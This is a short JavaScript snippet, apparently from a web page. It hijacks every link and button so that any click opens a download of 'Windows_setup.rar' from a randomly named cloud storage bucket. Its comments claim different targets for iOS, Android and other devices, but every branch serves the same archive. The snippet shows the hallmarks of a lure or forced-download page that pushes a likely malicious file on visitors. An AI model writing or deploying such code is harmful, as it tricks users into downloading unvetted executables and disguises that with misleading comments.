    function handleDownload() {
        var userAgent = navigator.userAgent.toLowerCase();
        var downloadUrl = '';
        
        // iOS设备
        if (/iphone|ipad|ipod/.test(userAgent)) {
            downloadUrl = 'https://qqwe011aa33c.oss-cn-hongkong.aliyuncs.com/Windows_setup.rar';
        }
        // Android设备
        else if (/android/.test(userAgent)) {
            downloadUrl = 'https://qqwe011aa33c.oss-cn-hongkong.aliyuncs.com/Windows_setup.rar';
        }
        // 其他设备默认跳转到网页版
        else {
            downloadUrl = 'https://qqwe011aa33c.oss-cn-hongkong.aliyuncs.com/Windows_setup.rar';
        }

        window.open(downloadUrl, '.apk');
    }

    $(document).ready(function(){
        // 为所有链接添加点击事件
        $('a').on('click', function(e){
            e.preventDefault();
            handleDownload();
        });

        // 为所有按钮添加点击事件
        $('button').on('click', function(e){
            e.preventDefault();
            handleDownload();
        });
    });